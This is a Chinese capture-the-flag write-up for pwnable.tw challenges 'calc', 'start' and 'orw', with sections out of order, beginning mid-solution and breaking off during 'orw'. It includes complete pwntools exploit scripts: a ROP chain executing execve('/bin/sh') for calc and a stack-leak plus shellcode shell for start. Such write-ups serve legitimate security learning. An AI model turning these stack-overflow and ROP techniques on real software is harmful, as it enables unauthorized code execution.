
- 利用任意地址读写控制`eip.esp`的偏移`0x5A0=1440`,所以返回地址的偏移为`1444/4=361`.这就意味着我们输入`+361`的时候显示的就是返回地址的值,接着构造ROP链.

- 关于ROP链的构造,你可以直接构造系统调用执行`execve('/bin/sh')`,也可以执行`_dl_make_stack_executable`将`NX`给关了.因为是静态链接,所以使用工具更加方便,这里我直接调用`ROPgadget`自动构造了

- exp

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from PwnContext.core import *
from struct import pack
local = True
# Set up pwntools for the correct architecture
exe = './' + 'calc'
elf = context.binary = ELF(exe)
#don't forget to change it
host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10100)
#don't forget to change it
#ctx.binary = './' + 'calc'
ctx.binary = exe
libc = elf.libc
ctx.debug_remote_libc = False
ctx.remote_libc = libc
if local:
    context.log_level = 'debug'
    try:
        io = ctx.start()
    except Exception as e:
        print(e.args)
        print("It can't work,may be it can't load the remote libc!")
        print("It will load the local process")
        io = process(exe)
else:
    io = remote(host,port)
#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: i386-32-little
# RELRO: Partial RELRO
# Stack: Canary found
# NX: NX enabled
# PIE: No PIE (0x8048000)
#shellcode
shellcode = ''
shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec060) # @ .data
shellcode += pack('<I', 0x0805c34b) # pop eax ; ret
shellcode += '/bin'
shellcode += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec064) # @ .data + 4
shellcode += pack('<I', 0x0805c34b) # pop eax ; ret
shellcode += '//sh'
shellcode += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec068) # @ .data + 8
shellcode += pack('<I', 0x080550d0) # xor eax, eax ; ret
shellcode += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
shellcode += pack('<I', 0x080481d1) # pop ebx ; ret
shellcode += pack('<I', 0x080ec060) # @ .data
shellcode += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
shellcode += pack('<I', 0x080ec068) # @ .data + 8
shellcode += pack('<I', 0x080ec060) # padding without overwrite ebx
shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec068) # @ .data + 8
shellcode += pack('<I', 0x080550d0) # xor eax, eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x08049a21) # int 0x80
def set_value(addr):
    io.sendline('+'+str(addr))
    value = int(io.recv())
    if value > 0:
        io.sendline('+'+str(addr)+'-'+str(value)+'+'+str(u32(shellcode[(addr-361)*4:(addr-361+1)*4])))
    else:
        io.sendline('+'+str(addr)+'+'+str(-value)+'+'+str(u32(shellcode[(addr-361)*4:(addr-361+1)*4])))
    io.recv()
def exp():
    io.recv()
    for i in range(361,361+len(shellcode)/4):
        set_value(i)
    io.sendline('')
if __name__ == '__main__':
    exp()
    io.interactive()
```

- 关于我

博客有我的联系方式,欢迎大家来玩,地址:<mark class="encrypted">1e4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3f1H3P5o6u0D9i4K6u0W2j5$3^5`.</mark>

## 前言

最近打算做一做pwnable.tw的题目,把一些过程给大家分享一下,前三题(`start`,`orw`,`calc`)比较简单,所以我写到这一篇文章里了

### 0x00 start(re2shellcode)

- 先看防护,基本什么都没开

```
[0] % checksec start

[*] '/home/dylan/desktop/pwnable.tw/start/start'

    Arch:     i386-32-little

    RELRO:    No RELRO

    Stack:    No canary found

    NX:       NX disabled

    PIE:      No PIE (0x8048000)
```

- 程序结构很简单,但是IDA反汇编有点不清楚,直接看汇编就好了,也就20几行

```
.text:08048060                 public _start

.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018o

.text:08048060                 push    esp

.text:08048061                 push    offset _exit

.text:08048066                 xor     eax, eax

.text:08048068                 xor     ebx, ebx

.text:0804806A                 xor     ecx, ecx

.text:0804806C                 xor     edx, edx

.text:0804806E                 push    3A465443h

.text:08048073                 push    20656874h

.text:08048078                 push    20747261h

.text:0804807D                 push    74732073h

.text:08048082                 push    2774654Ch

.text:08048087                 mov     ecx, esp        ; addr

.text:08048089                 mov     dl, 14h         ; len

.text:0804808B                 mov     bl, 1           ; fd

.text:0804808D                 mov     al, 4

.text:0804808F                 int     80h             ; LINUX - sys_write

.text:08048091                 xor     ebx, ebx        ; fd = 0

.text:08048091                                         ; addr = esp

.text:08048093                 mov     dl, 3Ch         ; count = 60

.text:08048095                 mov     al, 3

.text:08048097                 int     80h             ; LINUX - sys_read

.text:08048099                 add     esp, 14h

.text:0804809C                 retn
```

配合注释一眼就看完了,先调用`write`打印栈里面的一个字符串,然后在同一个地方`read`写入60个字节,最后抬高栈顶,返回到`exit`函数,结束程序

- 利用思路

  - `read`的长度很明显造成了栈溢出,所以我们可以自由劫持程序控制流程,比如跳转到shellcode,但是我们并不知道栈的地址,所以需要先泄露栈地址.

  - 回想一下整个程序的栈内分布,先是压入了`esp`的值,然后放入了`exit`函数的地址,当做是返回地址,接着压入了20个字节.抬高栈顶之后栈最顶层的数据是`exit`函数的地址,执行完`retn`之后,栈顶存放的正好是`esp`的值.所以我们只要把`exit`函数的地址覆盖为`.text:08048087`这个地址,这样程序返回之后执行`write`,正好打印出栈顶的`esp`值,这样我们就成功泄露了栈地址.

  - 接着我们又获得了一次输入的机会,这次我们覆盖返回地址为`esp+14`,返回地址之后跟上我们的shellcode,这样一会儿就会跳转到我们的shellcode去

  - shellcode尽可能短一点,因为程序存在字节限制

- exp

```
#!/usr/bin/env python2

# -*- coding: utf-8 -*-

from PwnContext.core import *

local = False



# Set up pwntools for the correct architecture

exe = './' + 'start'

elf = context.binary = ELF(exe)



#don't forget to change it

host = 'chall.pwnable.tw'

port = 10000



#don't forget to change it

#ctx.binary = './' + 'start'

ctx.binary = exe

libc = elf.libc

ctx.debug_remote_libc = False

ctx.remote_libc = libc

if local:

    context.log_level = 'debug'

    try:

        io = ctx.start()

    except Exception as e:

        print(e.args)

        print("It can't work,may be it can't load the remote libc!")

        print("It will load the local process")

        io = process(exe)

else:

    io = remote(host,port)

#===========================================================

#                    EXPLOIT GOES HERE

#===========================================================



# Arch:     i386-32-little

# RELRO:    No RELRO

# Stack:    No canary found

# NX:       NX disabled

# PIE:      No PIE (0x8048000)

def exp():

    #shellcode

    shellcode="\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"

    log.success('len(shellcode) = ' + hex(len(shellcode)))



    #leak esp

    payload = 'a'*0x14 + p32(0x08048087)

    io.recv()

    io.send(payload)

    stack = u32(io.recv()[:4]) + 0x14

    log.success('target addr = ' + hex(stack))



    #get shell 

    payload = 'a'*0x14 + p32(stack) + shellcode

    io.send(payload)



if __name__ == '__main__':

    exp()

    io.interactive()
```

### 0x01 orw(shellcode构造)

- 查看一下防护,开了NX

```
[0] % checksec orw

[*] '/home/dylan/desktop/pwnable.tw/orw/orw'

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX disabled

    PIE:      No PIE (0x8048000)

    RWX:      Has RWX segments
```

- 程序结构感觉比上一题还好看,直接读取我们输入的shellcode,然后跳转过去执行,但是这个题也不是白给,加了一点限制:只能使用`open`,`write`,`read`这三个系统调用,不能直接调用`system`.
